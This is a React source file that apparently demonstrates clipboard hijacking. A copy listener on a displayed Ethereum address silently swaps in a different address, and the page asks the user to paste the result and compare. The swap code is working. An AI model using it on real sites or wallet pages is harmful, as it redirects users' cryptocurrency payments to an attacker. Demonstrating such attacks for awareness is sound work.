import './App.css';
import { React, useEffect, useState } from "react";
import Chain from "./Chain";

let ADDRESS = "0x6356230A0Afb886dc79975FBa4a814f368A80A8F"
let REPLACE_ADDRESS = "0x1b198ee33FBC1Ac94cA0c50AD8f12271d7E153C8"

function TargetArea() {
  return (
    <div className="TargetArea">
      Paste Field
      <input style={{"marginLeft": "20px"}} type="text"></input>
    </div>
  )
}

function SourceArea({address}) {
  
  return (
    <div>
      <div id="source-contract">
        <span>{address}</span>
      </div>
      <br/>
      <span><strong>Or use your own address</strong></span>
      <br/>
      <br/>
      <button>Use My Address</button>
    </div>
  )
}

function handleCopy(event) {
  console.log("copy event detected", event)
  event.clipboardData.setData("text/plain", REPLACE_ADDRESS)
  event.preventDefault()
}

const InstructionStep = (props) => {
  return (
    <div className='InstructionStep'>
      <h2 className={'head' + ' ' + (props.i % 2 ? 'text-left' : 'text-right')}>
        {props.i}. {props.text} 
      </h2>
      <h4>{props.subtext}</h4>
      {props.children}
    </div>
  )
}

function App() {

  let [sourceAddress, setSourceAddress] = useState(ADDRESS)

  useEffect(() => {
    document.getElementById("source-contract")
            .addEventListener("copy", handleCopy)
    return () => {}
  }, [])

  return (
    <div className="App">
      <header className="App-header">
        Malicious Site
      </header>
      <div>
        <div className="InstructionField">
          <InstructionStep 
            i={0} 
            text={"Connect to the Ethereum Blockchain"}
            subtext={"Copy this address"}
          >
            <Chain filterAttributes={["Activate", "GetAccount"]} />
          </InstructionStep>

          <InstructionStep 
            i={1} 
            text={"Source Address"}
            subtext={"Copy this address"}
          >
            <SourceArea address={ADDRESS}/>
          </InstructionStep>

          <InstructionStep 
            i={2} 
            text={"Paste Target"}
            subtext={"Paste what you copied here and compare the difference"}
          >
            <TargetArea />
          </InstructionStep>
        </div>
      </div>
    </div>
  );
}

export default App;
